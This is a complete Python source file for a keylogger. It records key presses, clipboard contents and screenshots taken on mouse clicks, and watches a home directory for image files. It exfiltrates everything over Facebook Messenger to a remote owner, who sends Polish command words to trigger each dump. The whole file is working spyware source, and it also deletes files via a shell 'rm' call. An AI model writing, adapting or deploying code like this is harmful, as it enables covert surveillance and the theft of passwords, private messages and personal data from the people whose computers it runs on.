import os

import glob
import re
import keyboard
from keyboard import mouse
import pyscreenshot
from PIL import ImageDraw
import pymouse
import fbchat
from watchdog.observers import Observer
from watchdog.events import RegexMatchingEventHandler
from Queue import Queue


class FacebookController(fbchat.Client):
    def __init__(self, login, password, owner_uid, keylogger):
        super(FacebookController, self).__init__(login, password)

        self.owner_uid = owner_uid
        self.keylogger = keylogger

    def send_to_owner(self, message):
        self.send(self.owner_uid, message)

    def on_message(self, mid, author_id, author_name, message, metadata):
        if 'patrz' in message:
            self.keylogger.toggle_screenshots_capturing()
        if message == 'screen':
            for screenshot in self.keylogger.get_saved_screenshots():
                self.sendLocalImage(self.owner_uid, message='to widzialem: {}'.format(screenshot), image=screenshot)
            self.keylogger.reset_screenshot_directory()
        if 'karta' in message:
            self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))

        if 'schowek' in message:
            self.keylogger.toggle_clipboard_capturing()
        if 'schowku' in message:
            self.send_to_owner('\n'.join(self.keylogger.flush_captured_clipboard()))
        if 'pliki' in message:
            self.send_to_owner('\n'.join(self.keylogger.flush_file_events()))


class HomeDirectoryImageWatcher(RegexMatchingEventHandler):
    regexes = [re.compile('.*png$'), re.compile('.*svg$')]
    ignore_regexes = [re.compile(r'.*\..{4,}.*')]

    def __init__(self, keylogger, *args, **kwargs):
        self.keylogger = keylogger

        super(HomeDirectoryImageWatcher, self).__init__(*args, **kwargs)

    def on_any_event(self, event):
        self.keylogger.add_file_event(event.src_path)


class Keylogger(object):
    def __init__(self):
        self.captured_keys = []
        self.captured_pasting = []
        self.file_events = Queue()
        self.capture_screenshots_on_click = False
        self.clipboard_capturing = False
        self.previous_clipboard_content = ''

        self.reset_screenshot_directory()

        keyboard.on_press(self._on_key_press)
        keyboard.add_hotkey('ctrl+v', self._on_paste)
        keyboard.mouse.hook(self._on_left_mouse_button_click)

        self._enable_home_directory_watching()

    def _enable_home_directory_watching(self):
        observer = Observer()
        observer.schedule(HomeDirectoryImageWatcher(self), path='/home/szacun/', recursive=True)
        observer.start()

    def toggle_screenshots_capturing(self):
        self.capture_screenshots_on_click = not self.capture_screenshots_on_click

    def toggle_clipboard_capturing(self):
        self.clipboard_capturing = not self.clipboard_capturing

    def flush_captured_keys(self):
        captured_keys, self.captured_keys = self.captured_keys, []
        return captured_keys

    def flush_captured_clipboard(self):
        captured_clipboard, self.captured_pasting = self.captured_pasting, []
        return captured_clipboard

    def flush_file_events(self):
        events = set()

        while not self.file_events.empty():
            events.add(self.file_events.get())

        return events

    def add_file_event(self, file_path):
        self.file_events.put(file_path)

    def get_saved_screenshots(self):
        return glob.glob('/tmp/screen*.jpg')

    def reset_screenshot_directory(self):
        self.screenshot_counter = 0
        os.system('rm /tmp/screen*.jpg')

    def _on_left_mouse_button_click(self, *args, **kwargs):
        if self.capture_screenshots_on_click:
            mouse_x, mouse_y = pymouse.PyMouse().position()
            screenshot = self._mark_mouse_position(pyscreenshot.grab(), mouse_x, mouse_y)
            screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
            self.screenshot_counter += 1

        if self.clipboard_capturing:
            import pyperclip # Doesn't work when imported globally
            clipboard_content = pyperclip.paste()
            if self.previous_clipboard_content != clipboard_content:
                self.previous_clipboard_content = clipboard_content
                self.captured_pasting.append(clipboard_content)

    def _mark_mouse_position(self, screenshot, mouse_x, mouse_y):
        ImageDraw.Draw(screenshot).ellipse([mouse_x - 10, mouse_y - 10, mouse_x + 10, mouse_y + 10], fill=(0, 0, 255))

        return screenshot

    def _on_key_press(self, event):
        if event.name == 'alt gr':
            event.name = 'alt'
        if len(event.name) > 1:
            event.name = '[{}]'.format(event.name)
        self.captured_keys.append(event.name)

    def _on_paste(self):
        if self.clipboard_capturing:
            import pyperclip # Doesn't work when imported globally
            self.captured_pasting.append(pyperclip.paste())


k = Keylogger()
controller = FacebookController(os.environ['FACEBOOK_LOGIN_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_PASSWORD_TO_SEND_KEYLOGGER_LOGS_FROM'],
                                os.environ['FACEBOOK_KEYLOGGER_OWNER_UID'],
                                k)
controller.send_to_owner('Wtam, jestem Pomocnikiem Magika. Do uslug')
controller.listen()
